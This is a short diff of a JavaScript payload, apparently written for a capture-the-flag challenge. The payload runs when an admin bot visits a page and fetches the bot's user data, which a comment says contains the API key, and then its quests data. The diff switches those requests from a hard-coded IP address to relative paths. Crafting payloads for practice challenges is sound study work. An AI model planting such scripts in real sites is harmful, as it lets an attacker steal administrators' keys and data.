@@ -76,7 +76,7 @@
     // This will execute when the admin bot visits the page
     window.onload = function() {
       // First, access user data (which contains the API key)
-      fetch('http://94.237.50.164:45551/api/user')
+      fetch('/api/user')
         .then(response => response.json())
         .then(userData => {
           // Display the user data
@@ -88,7 +88,7 @@
           }
           
           // Now retrieve quests data
-          return fetch('http://94.237.50.164:45551/api/quests');
+          return fetch('/api/quests');
         })
         .then(response => response.json())
         .then(questsData => {
